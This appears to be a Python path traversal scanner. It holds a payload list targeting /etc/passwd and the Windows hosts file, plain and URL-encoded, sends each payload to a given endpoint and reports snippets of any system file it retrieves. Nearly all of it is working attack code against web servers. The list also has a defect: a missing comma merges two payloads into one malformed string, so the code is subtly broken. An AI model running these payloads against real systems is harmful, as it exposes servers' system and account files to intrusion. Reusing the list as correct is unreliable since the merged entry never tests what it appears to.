import requests

payloads = [
    "etc/passwd",
    "../etc/passwd",
    "../../etc/passwd"
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd", 
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",  
    "..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts"
]

def isSensitive(response_text):
    return (
        "root:" in response_text or
        "[boot loader]" in response_text or
        "/bin/bash" in response_text or
        "localhost" in response_text
    )

def check_path_traversal(domain, vuln_endpoint):
    base_url = domain.rstrip('/') + vuln_endpoint
    results = []

    for payload in payloads:
        full_url = f"{base_url}{payload}"

        try:
            response = requests.get(full_url, timeout=7)
            snippet = response.text[:300]

            if response.status_code == 200 and isSensitive(response.text):
                results.append({
                    "payload": payload,
                    "url": full_url,
                    "vulnerable": True,
                    "snippet": snippet
                })
            else:
                results.append({
                    "payload": payload,
                    "url": full_url,
                    "vulnerable": False,
                    "status_code": response.status_code
                })

        except requests.exceptions.RequestException as e:
            results.append({
                "payload": payload,
                "url": full_url,
                "error": str(e),
                "vulnerable": False
            })

    return results
